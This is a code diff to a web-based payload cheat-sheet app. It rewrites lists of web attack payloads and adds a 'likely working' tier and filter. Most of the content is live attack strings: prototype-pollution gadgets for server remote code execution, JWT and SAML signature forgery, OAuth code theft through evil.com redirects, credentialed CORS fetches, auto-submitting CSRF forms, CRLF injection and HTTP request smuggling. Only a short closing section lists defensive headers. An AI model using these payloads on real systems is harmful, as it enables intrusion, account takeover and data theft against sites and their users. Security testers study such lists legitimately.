+  { id:"proto", title:"Prototype Pollution", icon:"⚙️", sev:"high", tags:["client","node","injection"],
+    desc:"Query/JSON pollution vectors plus server RCE gadgets (child_process spawn, EJS) and DOM-XSS sinks.", items:[
+    { p:"{\"__proto__\":{\"isAdmin\":true}}", t:"w", n:"flag/role pollution via a JSON merge" },
+    "constructor[prototype][isAdmin]=true",
+    { p:"{\"__proto__\":{\"argv0\":\"console.log(require('child_process').execSync('id'))//\",\"shell\":\"/bin/sh\",\"NODE_OPTIONS\":\"--eval=1\"}}", t:"w", n:"child_process spawn gadget → server RCE" },
+    { p:"{\"__proto__\":{\"client\":1,\"escapeFunction\":\"JSON.stringify;process.mainModule.require('child_process').execSync('id')\"}}", t:"w", n:"EJS render → RCE" },
+    { p:"?__proto__[onerror]=alert(1)", n:"client-side PP feeding a DOM XSS sink" },
+    { p:"{\"__proto__\":{\"status\":510}}", n:"Express DoS / response-tampering gadget" },
+    "a.__proto__.polluted=true"
   ]},
+
   { id:"jwt", title:"JWT / Token Attacks", icon:"🔑", sev:"high", tags:["auth","token","jwt"],
-    desc:"alg:none, RS256->HS256 confusion, kid traversal/SQLi, jku/jwk injection, weak-secret brute.", items:[
-    "alg:none -> eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.   (keep trailing dot)",
-    "RS256 -> HS256 confusion: sign with the RSA public key as HMAC secret",
-    "kid path traversal: \"kid\":\"../../../../dev/null\" + empty HS256 secret",
-    "kid SQLi: \"kid\":\"x' UNION SELECT 'attacker_key'-- \"",
-    "jku injection: \"jku\":\"https://evil.com/jwks.json\"",
-    "embedded jwk header: \"jwk\":{\"kty\":\"RSA\",\"n\":\"...\",\"e\":\"AQAB\"}",
-    "x5u injection: \"x5u\":\"https://evil.com/cert.pem\"",
-    "weak secret brute: hashcat -m 16500 jwt.txt rockyou.txt",
-    "claim tampering: {\"sub\":\"attacker\",\"role\":\"admin\"}",
-    "expired token replay (check exp/nbf enforcement)"
+    desc:"alg confusion, psychic signatures, kid traversal/SQLi, jku/jwk injection, and weak-secret brute.", items:[
+    { p:"alg:none → header {\"alg\":\"none\"}, drop the signature (keep trailing dot)", t:"w", n:"some libraries still accept 'none'" },
+    { p:"RS256→HS256: sign with the server's RSA public key as the HMAC secret", t:"w", n:"algorithm confusion forges any claim" },
+    { p:"ECDSA r=0,s=0 (CVE-2022-21449 'psychic signature')", t:"w", n:"Java 15-18 accept a blank ECDSA signature" },
+    { p:"kid: ../../../../dev/null  +  HMAC key = ''", t:"w", n:"point kid at a known-content/empty file, then forge" },
+    "kid: x' UNION SELECT 'attackerkey'-- ",
+    { p:"jku: https://evil.com/jwks.json", t:"w", n:"host your own JWKS if jku host isn't pinned" },
+    "jwk: embed attacker public key in the header (CVE-2018-0114 style)",
+    "hashcat -m 16500 jwt.txt rockyou.txt",
+    "X-Forwarded-For: 127.0.0.1  /  X-Original-URL: /admin"
   ]},
+
   { id:"oauth", title:"OAuth 2.0 / OIDC", icon:"🪪", sev:"high", tags:["auth","oauth","sso"],
-    desc:"redirect_uri confusion, state/nonce removal, code leakage, and mutable-claim account takeover.", items:[
-    "redirect_uri=https://client.com/callback/../fakepath",
-    "redirect_uri=https://client.com/callback%2f%2e%2e%2ffake",
+    desc:"redirect_uri confusion, code leakage via chained redirects/fragments, state removal, PKCE downgrade.", items:[
+    { p:"redirect_uri=https://client.com/callback?next=//evil.com", t:"w", n:"a second open-redirect on the client steals the code" },
+    { p:"redirect_uri=https://client.com/callback/../../evil", t:"w", n:"path traversal / normalisation differential" },
     "redirect_uri=https://client.com@evil.com",
-    "redirect_uri=https://client.com.evil.com",
-    "redirect_uri=https://client.com%23.evil.com",
-    "response_type=code id_token   (force fragment leak)",
-    "response_mode=fragment   (strand code in #)",
-    "state=   (removed -> login CSRF)",
-    "nonce=   (removed -> ID token replay)",
-    "aud=attacker_client_id   (client confusion)",
-    "mutable claim: unverified {\"email\":\"victim@target.com\"} from attacker tenant",
-    "scope=openid profile email offline_access   (over-broad grant)"
+    { p:"response_type=code id_token token", t:"w", n:"forces the code into the URL fragment where it can leak" },
+    { p:"prompt=none inside a hidden iframe", n:"silent code theft when the victim has a live session" },
+    { p:"state=  (removed)", t:"w", n:"no state → login CSRF / no CSRF protection" },
+    "nonce=  (removed → ID-token replay)",
+    { p:"drop code_challenge (PKCE downgrade)", n:"if the server still issues a code, PKCE isn't enforced" },
+    "reuse an authorization code twice (check one-time enforcement)"
   ]},
+
   { id:"saml", title:"SAML Bypass", icon:"🏛️", sev:"high", tags:["auth","saml","sso"],
-    desc:"Signature exclusion & wrapping (XSW 1-8), comment injection, parser differentials, replay.", items:[
-    "Remove the <Signature> element entirely   (signature exclusion)",
-    "XSW #1: clone assertion, wrap original in <Extensions>",
-    "XSW #2: detach assertion, wrap in a new <Response>",
-    "XSW #3: move assertion into <Signature><Object>",
-    "NameID comment injection: admin@target.com<!--x-->.evil.com",
-    "Assertion unsigned but Response signed   (scope mismatch)",
+    desc:"Signature exclusion & wrapping (XSW), NameID comment injection, parser differentials, and replay.", items:[
+    { p:"remove the <Signature> element entirely", t:"w", n:"signature exclusion — some verifiers skip when absent" },
+    { p:"XSW: clone the assertion, sign one, swap in the other", t:"w", n:"signature wrapping (variants 1-8)" },
+    { p:"NameID: admin@target.com<!---->.evil.com", t:"w", n:"comment injection — verifier and app read different values" },
+    "assertion unsigned but Response signed (scope mismatch)",
     "DOCTYPE differential (REXML vs Nokogiri) to smuggle a second assertion",
-    "Replay a valid SAML Response   (check NotOnOrAfter / OneTimeUse)",
-    "InResponseTo removed   (check binding enforcement)"
+    "replay a valid Response (check NotOnOrAfter / OneTimeUse)",
+    "InResponseTo removed (check binding enforcement)"
   ]},
+
   { id:"cors", title:"CORS Misconfiguration", icon:"↔️", sev:"med", tags:["client","cors","misconfig"],
-    desc:"Origin reflection, null origin, prefix/suffix matching, and credentialed cross-origin reads.", items:[
-    "Origin: https://evil.com   (test reflection in ACAO)",
-    "Origin: null   (sandboxed iframe / data: doc)",
-    "Origin: https://target.com.evil.com   (suffix match)",
-    "Origin: https://evil-target.com   (prefix match)",
-    "Origin: https://sub.target.com   (wildcard subdomain trust)",
-    "Origin: https://target.com%60.evil.com   (backtick parser trick)",
-    "fetch('https://target.com/api/me',{credentials:'include'})   (exfil if ACAC:true)",
-    "check for Access-Control-Allow-Credentials: true with reflected origin"
+    desc:"Origin reflection, null origin, sloppy prefix/suffix matching, and scheme-downgrade trust.", items:[
+    { p:"Origin: https://evil.com", t:"w", n:"if reflected in ACAO with credentials, cross-origin read" },
+    { p:"Origin: null", t:"w", n:"a sandboxed iframe / data: doc sends Origin: null" },
+    { p:"Origin: https://target.com.evil.com", t:"w", n:"suffix match on a naive regex" },
+    "Origin: https://eviltarget.com  (prefix match)",
+    "Origin: https://target.com  (scheme downgrade to http trust)",
+    "Origin: https://sub.target.com  (any-subdomain trust)",
+    { p:"fetch('https://target/api/me',{credentials:'include'})", n:"exploit body once ACAO+ACAC are confirmed" }
   ]},
+
   { id:"csrf", title:"CSRF Tricks", icon:"🪤", sev:"med", tags:["auth","client","csrf"],
-    desc:"Auto-submitting forms, GET side effects, and SameSite / token-validation bypasses.", items:[
-    "<form action=https://target/transfer method=POST><input name=to value=evil><input name=amt value=1000></form><script>document.forms[0].submit()<\/script>",
-    "<img src=\"https://target/api/delete?id=1\">",
-    "fetch('https://target/api',{method:'POST',credentials:'include',body:'x=1'})",
-    "SameSite=Lax bypass: top-level GET navigation with side effects",
-    "method override: POST with _method=DELETE or X-HTTP-Method-Override",
-    "empty/removed CSRF token accepted (check token validation)",
-    "swap victim token for attacker's (token not bound to session)",
-    "Content-Type: text/plain to skip CORS preflight on JSON endpoints"
+    desc:"Preflight-free JSON smuggling, SameSite=Lax edge cases, method override, and token-binding gaps.", items:[
+    { p:"<form action=https://target/api method=POST enctype=text/plain><input name='{\"x\":\"' value='\"}'></form> + auto-submit", t:"w", n:"sends JSON as a simple request — no CORS preflight" },
+    { p:"SameSite=Lax bypass: top-level GET that mutates state", t:"w", n:"Lax still allows top-level navigations" },
+    "<form ...><input name=_method value=PUT> (method override)",
+    { p:"swap the victim's CSRF token for the attacker's", n:"token not bound to the session" },
+    "<img src=https://target/api/delete?id=1> (GET side-effect)",
+    "multipart/form-data body to keep it a simple request"
   ]},
+
   { id:"idor", title:"IDOR / Access Control", icon:"🔓", sev:"high", tags:["authz","logic","api"],
-    desc:"Object & UUID enumeration, method/param tampering, mass assignment, and route confusion.", items:[
-    "GET /api/user/1001  ->  change to /1002",
-    "GET /api/invoice/00001  ->  /00002   (sequential IDs)",
-    "id=SELF  ->  id=OTHER_UUID leaked in a prior response",
-    "?userId=123  ->  ?userId[]=123   (type juggling)",
-    "wrap id: {\"id\":\"123\"} vs {\"id\":123}",
-    "mass assignment: POST /api/user {\"id\":1,\"role\":\"admin\"}",
-    "PUT /api/user/123 {\"isAdmin\":true}",
-    "header trust: X-User-Id: 2 / X-Forwarded-For: 127.0.0.1",
-    "method swap: GET blocked -> try POST/PUT/PATCH/DELETE",
-    "path bypass: /admin 403 -> /Admin, /admin/, /admin/.",
-    "version pivot: /api/v1/ blocked -> /api/v2/ or /api/internal/",
-    "GraphQL node(id:) global object enumeration"
+    desc:"Parameter pollution & type juggling, mass assignment, header trust, and method / route confusion.", items:[
+    { p:"id=me&id=<victim>  (HTTP parameter pollution)", t:"w", n:"authz checks the first value, the query uses the last (or vice-versa)" },
+    { p:"id[]=<victim>  (array wrap)", t:"w", n:"type juggling skips an ownership comparison" },
+    { p:"POST body {\"id\":1,\"role\":\"admin\"}  (mass assignment)", t:"w", n:"bind a field the UI never exposes" },
+    { p:"X-User-Id: 2  /  X-Forwarded-For: 127.0.0.1", t:"w", n:"header trust for identity / IP allow-lists" },
+    { p:"GET /admin → 403; try /Admin, /admin/, /admin/.", t:"w", n:"path normalisation / case bypass" },
+    "method swap: GET blocked → try POST/PUT/PATCH",
+    "version pivot: /api/v1 blocked → /api/v2 or /api/internal",
+    { p:"GraphQL node(id:\"<base64>\") global-object read", n:"Relay node() IDOR" },
+    "sequential/UUID enumeration on /invoice/00001"
   ]},
+
   { id:"open-redirect", title:"Open Redirect", icon:"↪️", sev:"low", tags:["client","redirect","auth"],
-    desc:"Protocol-relative, backslash & @ tricks, URL-parser differentials, and javascript:/data: URIs.", items:[
-    "//evil.com",
-    "/\\evil.com",
-    "////evil.com",
-    "https://target.com@evil.com",
-    "https://target.com.evil.com",
-    "https://evil.com%23.target.com",
+    desc:"Backslash/tab normalisation, userinfo confusion, encoded traversal, and known-good-prefix bypass.", items:[
+    { p:"https://target.com%2F%2E%2E%2F%40evil.com", t:"w", n:"encoded path + @ produces a parser differential" },
+    { p:"/\\evil.com  |  /%09/evil.com", t:"w", n:"browsers normalise \\ and tabs to //" },
+    "https://target.com\\.evil.com",
+    "https://evil.com\\@target.com",
+    { p:"//google.com/%2f..%2f%2f evil.com", n:"defeats a 'must start with a known host' check" },
     "https:evil.com",
-    "/%0d/evil.com",
-    "///evil.com/%2f..",
-    "javascript://%0aalert(1)"
+    "javascript:alert(document.domain)//%0a"
   ]},
+
   { id:"crlf", title:"CRLF / Header Injection", icon:"📡", sev:"med", tags:["server","http","injection"],
-    desc:"Response splitting, cookie / Location injection, and cache poisoning via header injection.", items:[
-    "%0d%0aSet-Cookie:%20admin=true",
-    "%0d%0aLocation:%20https://evil.com",
-    "%E5%98%8A%E5%98%8DSet-Cookie:%20admin=true   (Unicode CR/LF)",
-    "%u000d%u000aSet-Cookie:%20evil=true",
-    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)<\/script>",
-    "User-Agent: <svg onload=alert(1)>   (stored via logs/headers)",
-    "X-Forwarded-Host: evil.com   (cache poisoning / reset link)",
-    "Host: evil.com   (password-reset poisoning)"
+    desc:"Unicode CR/LF WAF evasion, session-fixation cookies, injected Location, and disabling protections.", items:[
+    { p:"%E5%98%8A%E5%98%8DSet-Cookie:evil=1", t:"w", n:"overlong-unicode CR/LF (0x560A/0x560D) slips past filters" },
+    { p:"%0d%0aSet-Cookie:sessionid=<known>;path=/", t:"w", n:"session fixation via injected cookie" },
+    "%0d%0aLocation:https://evil.com%0d%0a%0d%0a",
+    "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<svg onload=alert()>",
+    "%0d%0aX-XSS-Protection:0",
+    "%u000d%u000aSet-Cookie:evil=1"
   ]},
+
   { id:"graphql", title:"GraphQL", icon:"🕸️", sev:"med", tags:["api","server","graphql"],
-    desc:"Introspection, batching/aliasing DoS, field enumeration, injection, and IDOR via node().", items:[
-    "{__schema{types{name fields{name}}}}   (introspection)",
-    "{__type(name:\"User\"){fields{name type{name}}}}",
-    "query{user(id:\"1' OR '1'='1\"){id}}   (injection into resolver)",
+    desc:"Field-suggestion recon (introspection off), alias/batch amplification, and node() IDOR.", items:[
+    { p:"query{u}  →  'Did you mean user?'", t:"u", n:"suggestions leak the schema even when introspection is disabled" },
+    { p:"{a:user(id:1){pw} b:user(id:2){pw} c:user(id:3){pw} ...}", t:"w", n:"alias amplification bypasses rate-limits / brute forces" },
+    { p:"[{\"query\":\"{user(id:1){pw}}\"},{\"query\":\"{user(id:2){pw}}\"}]", t:"w", n:"array batching for parallel enumeration" },
+    "{__schema{types{name fields{name}}}}",
+    { p:"query{node(id:\"VXNlcjox\"){... on User{email}}}", t:"w", n:"Relay global-id IDOR" },
     "mutation{updateUser(id:1,input:{role:\"admin\"}){id role}}",
-    "[{query:\"{u1:user(id:1){pw}}\"},{query:\"{u2:user(id:2){pw}}\"}]   (batching)",
-    "{a:user(id:1){pw} b:user(id:2){pw} c:user(id:3){pw}}   (alias brute force)",
-    "{user{id id id id id}}   (field duplication DoS)",
-    "query{node(id:\"VXNlcjox\"){... on User{email}}}   (global node IDOR)",
-    "query @deprecated {__typename}",
-    "disable introspection? try suggestions: {usr}  ->  'Did you mean user?'"
+    "deep nesting {a{b{a{b{a{b}}}}}}  (recursion DoS)",
+    "@skip/@include duplicated directives  (amplification)"
   ]},
+
   { id:"race", title:"Race Conditions", icon:"⏱️", sev:"high", tags:["server","logic","race"],
-    desc:"Single-packet attack, limit-overrun, TOCTOU windows, and coupon / OTP reuse.", items:[
-    "Single-packet attack: last-byte sync across 20+ connections (HTTP/2)",
-    "Turbo Intruder: race-single-packet.py",
-    "Limit overrun: 20x parallel POST /transfer",
-    "Coupon reuse: 50 concurrent POST /apply-coupon",
-    "2FA brute: 10000 concurrent POST /verify-otp",
-    "TOCTOU: read-then-act window on /withdraw balance check",
-    "Idempotency bypass: 30x POST /redeem-voucher",
-    "Follower count: POST /follow + DELETE /follow raced",
-    "Upload + rename race (write executes before validation)"
+    desc:"Single-packet attack, limit-overrun, OTP/2FA brute race, and confirm-token TOCTOU takeover.", items:[
+    { p:"single-packet attack: 20-30 reqs, last-byte synced over HTTP/2", t:"w", n:"removes network jitter — the highest-reliability race primitive" },
+    { p:"Turbo Intruder: race-single-packet.py", t:"w", n:"ready-made single-packet harness" },
+    { p:"limit overrun: 20x parallel POST /transfer or /redeem", t:"w", n:"spend/withdraw more than the balance allows" },
+    { p:"2FA/OTP brute: fire many codes inside one validation window", t:"w", n:"beats attempt counters" },
+    { p:"email-change + verify raced → account takeover", n:"confirm-token TOCTOU" },
+    "coupon / gift-card double-spend",
+    "upload + rename race (executes before validation)"
   ]},
+
   { id:"smuggling", title:"HTTP Request Smuggling", icon:"🚇", sev:"crit", tags:["server","http","desync"],
-    desc:"CL.TE / TE.CL / TE.TE, HTTP/2 downgrade (H2.CL / H2.TE) desync, and cache poisoning.", items:[
-    "CL.TE: Content-Length: 6  +  Transfer-Encoding: chunked",
-    "TE.CL: Transfer-Encoding: chunked  +  Content-Length: 4",
-    "TE.TE obfuscation: \"Transfer-Encoding: chunked\" + \"Transfer-Encoding: x\"",
-    "TE line folding: \"Transfer-Encoding:\\r\\n chunked\"",
-    "TE hex smuggle: \"Transfer-Encoding: chunke\\x64\"",
-    "H2.CL desync: HTTP/2 request with content-length: 0 downgraded to HTTP/1.1",
-    "H2.TE desync: HTTP/2 request carrying transfer-encoding: chunked",
-    "CRLF in H2 header value -> request splitting on downgrade",
-    "smuggle prefix: 0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: target"
+    desc:"CL.TE / TE.CL, duplicate/obfuscated TE, HTTP/2 downgrade (H2.CL / H2.TE), and cache poisoning.", items:[
+    { p:"CL.TE — Content-Length: 6 + Transfer-Encoding: chunked", t:"w", n:"front-end uses CL, back-end uses TE" },
+    { p:"TE.CL — Transfer-Encoding: chunked + Content-Length: 4", t:"w", n:"reverse divergence" },
+    { p:"Transfer-Encoding: chunked\\r\\nTransfer-encoding: cow", t:"w", n:"duplicate/obfuscated TE header" },
+    { p:"H2.CL — HTTP/2 request with content-length: 0", t:"w", n:"desync on HTTP/1.1 downgrade" },
+    "H2.TE — HTTP/2 request carrying transfer-encoding: chunked",
+    "0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: x  (smuggled prefix)",
+    { p:"CRLF in an HTTP/2 header value", n:"request splitting on downgrade → cache poisoning" }
   ]},
+
   { id:"ws", title:"WebSocket Attacks", icon:"🔌", sev:"med", tags:["client","websocket","api"],
-    desc:"Cross-site WebSocket hijacking (CSWSH), message injection, and auth / JSON-RPC abuse.", items:[
-    "new WebSocket('wss://target/ws') from evil origin   (CSWSH — no CORS on WS)",
-    "Origin: https://evil.com   (check handshake origin validation)",
-    "{\"type\":\"subscribe\",\"channel\":\"../admin\"}",
-    "{\"type\":\"message\",\"data\":\"<img src=x onerror=alert(1)>\"}   (stored XSS via WS)",
-    "{\"type\":\"sqli\",\"query\":\"1' OR '1'='1\"}",
+    desc:"Cross-site WebSocket hijacking, message injection, and unauth JSON-RPC / subprotocol abuse.", items:[
+    { p:"new WebSocket('wss://target/ws') from an evil origin", t:"w", n:"CSWSH — no CORS on WebSockets, steals data if cookie-authed" },
+    { p:"Origin: https://evil.com on the handshake", t:"w", n:"test whether the origin is actually validated" },
+    "{\"type\":\"message\",\"data\":\"<img src=x onerror=alert()>\"}",
     "{\"__proto__\":{\"isAdmin\":true},\"action\":\"getUsers\"}",
-    "{\"type\":\"auth\",\"token\":\"\",\"role\":\"admin\"}",
-    "{\"id\":1,\"jsonrpc\":\"2.0\",\"method\":\"admin.getConfig\"}"
+    { p:"{\"jsonrpc\":\"2.0\",\"method\":\"admin.getConfig\",\"id\":1}", n:"reach privileged JSON-RPC methods unauthenticated" },
+    "{\"type\":\"auth\",\"token\":\"\",\"role\":\"admin\"}"
   ]},
+
   { id:"headers", title:"Security Headers (defense)", icon:"🛡️", sev:"low", tags:["defense","http","headers"],
-    desc:"Defensive baseline — response headers that neutralise many of the payload classes above.", items:[
+    desc:"The defensive baseline — response headers that neutralise most of the payload classes above.", items:[
     "Content-Security-Policy: default-src 'self'; object-src 'none'; base-uri 'self'; require-trusted-types-for 'script'",
     "Strict-Transport-Security: max-age=63072000; includeSubDomains; preload",
     "X-Content-Type-Options: nosniff",
     "Referrer-Policy: strict-origin-when-cross-origin",
     "Permissions-Policy: camera=(), microphone=(), geolocation=()",
     "Cross-Origin-Opener-Policy: same-origin",
-    "Cross-Origin-Embedder-Policy: require-corp",
     "Cross-Origin-Resource-Policy: same-origin",
     "Set-Cookie: __Host-sid=...; Secure; HttpOnly; SameSite=Lax; Path=/"
   ]}
@@ -987,6 +977,7 @@ const state = {
   query: "",
   category: "all",
   favOnly: false,
+  workOnly: false,
   motion: true,
   scan: localStorage.getItem("scan") === "on",
   theme: localStorage.getItem("theme") || "matrix",
@@ -1106,8 +1097,17 @@ function highlight(text, q) {
 
 function payloadKey(catId, idx) { return catId + ":" + idx; }
 
-function makeItem(catId, p, idx) {
-  const key = payloadKey(catId, idx);
+/* Each payload is a plain string or { p, t, n }:
+   p = payload text · t = precision tier ("u" universal, "w" likely-working) · n = note. */
+function asItem(raw) { return (raw && typeof raw === "object") ? raw : { p: raw }; }
+const isWorking = t => t === "u" || t === "w";
+
+const TIER = {
+  u: { label: "UNIVERSAL", title: "Universal · high-precision, context-agnostic (low false-positive)" },
+  w: { label: "LIKELY",    title: "Likely working on real, non-trivially-defended targets" },
+};
+function makeItem(catId, it) {
+  const p = it.p, key = it.key != null ? it.key : payloadKey(catId, it.idx);
   const isFav = state.favs.has(key);
 
   const actions = el("div", { class: "actions" },
@@ -1118,12 +1118,16 @@ function makeItem(catId, p, idx) {
   );
 
   const item = el("div", {
-    class: "item" + (isFav ? " fav" : ""),
+    class: "item" + (isFav ? " fav" : "") + (it.t ? " tier-" + it.t : ""),
     role: "listitem",
     tabIndex: 0,
     data: { key, payload: p },
   });
+  if (it.t && TIER[it.t]) {
+    item.appendChild(el("span", { class: "badge badge-" + it.t, title: TIER[it.t].title, text: TIER[it.t].label }));
+  }
   item.appendChild(highlight(p, state.query));
+  if (it.n) item.appendChild(el("div", { class: "note", text: it.n }));
   item.appendChild(actions);
 
   item.addEventListener("click", e => {
@@ -1163,7 +1167,7 @@ function makeCard(c) {
   );
 
   const list = el("div", { class: "list", role: "list" });
-  for (const { p, idx } of c._items) list.appendChild(makeItem(c.id, p, idx));
+  for (const it of c._items) list.appendChild(makeItem(c.id, it));
 
   card.appendChild(head);
   if (c.desc) card.appendChild(el("p", { class: "card-desc", text: c.desc }));
@@ -1192,14 +1196,19 @@ function renderGrid() {
     .filter(c => state.category === "all" || c.id === state.category)
     .map(c => {
       const items = c.items
-        .map((p, idx) => ({ p, idx, key: payloadKey(c.id, idx) }))
-        .filter(({ p, key }) => {
+        .map((raw, idx) => {
+          const it = asItem(raw);
+          return { p: it.p, t: it.t, n: it.n, idx, key: payloadKey(c.id, idx) };
+        })
+        .filter(({ p, n, t, key }) => {
           if (state.favOnly && !state.favs.has(key)) return false;
+          if (state.workOnly && !isWorking(t)) return false;
           if (!q) return true;
           return p.toLowerCase().includes(q)
+              || (n && n.toLowerCase().includes(q))
               || c.title.toLowerCase().includes(q)
               || (c.desc && c.desc.toLowerCase().includes(q))
-              || c.tags.some(t => t.includes(q));
+              || c.tags.some(tag => tag.includes(q));
         });
       return { ...c, _items: items };
     })
@@ -1329,6 +1338,12 @@ $("#toggleFav").addEventListener("click", e => {
   e.currentTarget.setAttribute("aria-pressed", String(state.favOnly));
   renderGrid();
 });
+$("#toggleWork").addEventListener("click", e => {
+  state.workOnly = !state.workOnly;
+  e.currentTarget.setAttribute("aria-pressed", String(state.workOnly));
+  toast(state.workOnly ? "Likely-working / universal only" : "Showing all payloads");
+  renderGrid();
+});
 $("#toggleMotion").addEventListener("click", e => {
   state.motion = !state.motion;
   e.currentTarget.setAttribute("aria-pressed", String(state.motion));
@@ -1348,11 +1363,14 @@ function buildPaletteItems(q = "") {
     out.push({ label: `Theme: ${t}`, hint: "theme", run: () => applyTheme(t) }));
   if (state.voidUnlocked)
     out.push({ label: "Theme: void", hint: "theme", run: () => applyTheme("void") });
-  out.push({ label: "Toggle favorites only",      hint: "action", run: () => $("#toggleFav").click() });
-  out.push({ label: "Toggle background animation", hint: "action", run: () => $("#toggleMotion").click() });
-  out.push({ label: "Toggle CRT scanlines",        hint: "action", run: () => $("#toggleScan").click() });
-  DATA.forEach(c => c.items.forEach((p, idx) => {
-    out.push({ label: p, hint: c.title, run: () => copy(p), key: payloadKey(c.id, idx) });
+  out.push({ label: "Toggle favorites only",         hint: "action", run: () => $("#toggleFav").click() });
+  out.push({ label: "Toggle likely-working only",     hint: "action", run: () => $("#toggleWork").click() });
+  out.push({ label: "Toggle background animation",    hint: "action", run: () => $("#toggleMotion").click() });
+  out.push({ label: "Toggle CRT scanlines",           hint: "action", run: () => $("#toggleScan").click() });
+  DATA.forEach(c => c.items.forEach((raw, idx) => {
+    const it = asItem(raw);
+    const tierHint = it.t === "u" ? "★ universal · " : it.t === "w" ? "● likely · " : "";
+    out.push({ label: it.p, hint: tierHint + c.title, run: () => copy(it.p), key: payloadKey(c.id, idx) });
   }));
   if (!q) return out.slice(0, 60);
   const ql = q.toLowerCase();
@@ -1409,6 +1427,7 @@ function countUp(node, to, dur = 900) {
   requestAnimationFrame(step);
 }
 const totalPayloads = DATA.reduce((s, c) => s + c.items.length, 0);
+const precisionPayloads = DATA.reduce((s, c) => s + c.items.filter(x => isWorking(asItem(x).t)).length, 0);
 
 /* ============================================================
    SPOTLIGHT — body bg responds to cursor.
@@ -1564,6 +1583,7 @@ renderChips();
 renderGrid();
 countUp($("#statCats"), DATA.length);
 countUp($("#statPayloads"), totalPayloads);
+countUp($("#statPrecision"), precisionPayloads);
 $("#hudTheme").textContent = state.theme;
 </script>
 </body>
